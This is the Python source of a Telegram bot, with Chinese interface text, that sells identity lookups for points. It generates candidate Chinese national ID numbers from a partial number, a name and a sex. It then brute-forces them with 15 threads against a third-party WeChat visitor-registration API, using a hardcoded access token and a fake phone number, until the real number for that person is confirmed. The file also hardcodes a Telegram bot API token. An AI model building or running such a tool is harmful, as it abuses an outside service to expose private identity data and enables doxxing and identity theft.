import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 核心配置 (严格对齐截图) =================
API_TOKEN = '8417331227:AAESrsOPgEDMeu7NHgLMgoZrynkxoafBLBY'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'
DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9..." 

bot = telebot.TeleBot(API_TOKEN)
user_states = {}
generated_cache = {} 

# --- 数据管理 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): v for k, v in data.items()}
        except: pass
    tk = DEFAULT_TOKEN
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip(); tk = content if content else tk
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f: json.dump(user_points, f)

def is_valid_id(n):
    if len(n) != 18: return False
    try:
        n = n.upper()
        var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
        return var_id[checksum] == n[17]
    except: return False

# --- 完美进度条渲染 (核心改动) ---
def get_perfect_bar(done, total):
    if total <= 0: return ""
    percent = int(done / total * 100)
    # 按照截图比例，进度条总长度设为 18 格
    bar_len = 18
    filled = int(bar_len * done // total)
    # 使用 █ 表示已完成，▒ 表示未完成（这在预览里是小网格效果）
    bar = "█" * filled + "▒" * (bar_len - filled)
    return f"⏳ **核验中...**\n`[{bar}] {done}/{total} {percent}%`"

# --- 核心核验任务 (15线程 + UI平滑更新) ---
def run_batch_task(chat_id, msg_id, name, id_list, uid):
    global CURRENT_X_TOKEN
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json", "User-Agent": "Mozilla/5.0"}
    total, done = len(id_list), 0
    success_match, is_running, stop_signal = None, True, False

    def progress_monitor():
        nonlocal done, is_running, stop_signal
        last_ui = ""
        last_time = 0
        while is_running and not stop_signal:
            now = time.time()
            if now - last_time > 1.8: # 略微缩短频率，看起来更丝滑
                current_ui = get_perfect_bar(done, total)
                if current_ui != last_ui:
                    try:
                        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=current_ui, parse_mode='Markdown')
                        last_ui, last_time = current_ui, now
                    except: pass
            time.sleep(0.4)

    threading.Thread(target=progress_monitor, daemon=True).start()

    def verify(id_no):
        nonlocal done, is_running, stop_signal, success_match
        if stop_signal or not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=5)
            res = r.json()
            if res.get("code") == 401:
                is_running, stop_signal = False, True
                bot.send_message(chat_id, f"🚨 Token 失效，请联系 {ADMIN_USERNAME}")
                return
            if res.get("code") == 0:
                # 严格对齐截图成功界面
                success_match = (
                    f"✨ **核验成功！**\n"
                    f"👤 **姓名:** {name}\n"
                    f"🆔 **号码:** `{id_no}`\n"
                    f"✅ **验证通过**\n"
                    f"💰 **剩余积分:** {user_points[uid]}"
                )
                stop_signal, is_running = True, False
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=15) as executor:
        executor.map(verify, id_list)

    is_running = False 
    time.sleep(0.5)
    if success_match:
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"⏳ **核验完成**\n`[██████████████████] 100%`", parse_mode='Markdown')
        except: pass
        bot.send_message(chat_id, success_match, parse_mode='Markdown')
    else:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=f"❌ 核验完成，未发现匹配结果。")

# ================= 业务指令 (补全遗漏) =================

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0)
    text = (f"👋 **核验模式**\n"
            f"💰 积分: {pts}\n"
            f"💸 费用: 100/次\n"
            f"👤 管理员: {ADMIN_USERNAME}\n\n"
            f"请输入姓名:")
    bot.send_message(message.chat.id, text, parse_mode='Markdown')
    user_states[message.chat.id] = {'step': 'v_name'}

@bot.message_handler(commands=['gen'])
def gen_cmd(message):
    uid = message.from_user.id
    pts = user_points.get(uid, 0)
    text = (f"🛠 **生成模式**\n"
            f"💰 积分: {pts}\n"
            f"💸 费用: 50/次\n"
            f"👤 管理员: {ADMIN_USERNAME}\n\n"
            f"请输入补全号(x表示未知):")
    bot.send_message(message.chat.id, text, parse_mode='Markdown')
    user_states[message.chat.id] = {'step': 'g_card'}

@bot.callback_query_handler(func=lambda call: call.data == "start_verify_flow")
def callback_start_verify(call):
    uid = call.from_user.id
    if user_points.get(uid, 0) < 100:
        bot.answer_callback_query(call.id, "❌ 积分不足", show_alert=True); return
    bot.send_message(call.message.chat.id, "👤 请输入要核验的姓名:")
    user_states[call.message.chat.id] = {'step': 'v_name_after_gen'}
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: m.chat.id in user_states)
def handle_steps(message):
    state, uid, text = user_states[message.chat.id], message.from_user.id, message.text.strip()
    
    if state['step'] == 'g_card':
        user_states[message.chat.id].update({'step': 'g_sex', 'card': text.lower()})
        bot.send_message(message.chat.id, "请输入性别(男/女/未知):")

    elif state['step'] == 'g_sex':
        if user_points.get(uid, 0) < 50:
            bot.reply_to(message, "❌ 积分不足"); return
        bot.send_message(message.chat.id, "⌛ **正在计算补全...**")
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in state['card']]
        if text == "男": char_sets[16] = ["1", "3", "5", "7", "9"]
        elif text == "女": char_sets[16] = ["0", "2", "4", "6", "8"]
        ids = [num for res in itertools.product(*char_sets) if is_valid_id(num := "".join(res))][:5000]
        if ids:
            user_points[uid] -= 50; save_points()
            generated_cache[uid] = {'ids': ids}
            with open("铭.txt", "w") as f: f.write("\n".join(ids))
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🚀 立即核验这些号码 (100积分)", callback_data="start_verify_flow"))
            with open("铭.txt", "rb") as doc:
                bot.send_document(message.chat.id, doc, caption=f"✅ 生成成功！共 `{len(ids)}` 个\n💰 消耗 50 积分，余额 `{user_points[uid]}`", reply_markup=markup)
        del user_states[message.chat.id]

    elif state['step'] == 'v_name_after_gen':
        user_points[uid] -= 100; save_points()
        msg = bot.send_message(message.chat.id, "⌛ **准备核验...**")
        threading.Thread(target=run_batch_task, args=(message.chat.id, msg.message_id, text, generated_cache[uid]['ids'], uid)).start()
        del user_states[message.chat.id]

    elif state['step'] == 'v_name':
        user_states[message.chat.id].update({'step': 'v_ids', 'name': text})
        bot.send_message(message.chat.id, "请发送身份证号列表:")

    elif state['step'] == 'v_ids':
        v_ids = [i for i in re.findall(r'\d{17}[\dXx]', text) if is_valid_id(i)]
        if v_ids:
            user_points[uid] -= 100; save_points()
            msg = bot.send_message(message.chat.id, "⌛ **准备核验...**")
            threading.Thread(target=run_batch_task, args=(message.chat.id, msg.message_id, state['name'], v_ids, uid)).start()
        del user_states[message.chat.id]

# --- 管理指令 ---
@bot.message_handler(commands=['add'])
def add_points(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, tid, amt = message.text.split()
        user_points[int(tid)] = user_points.get(int(tid), 0) + int(amt)
        save_points()
        bot.reply_to(message, f"✅ 充值成功！余额: `{user_points[int(tid)]}`")
    except: pass

if __name__ == '__main__':
    bot.infinity_polling()
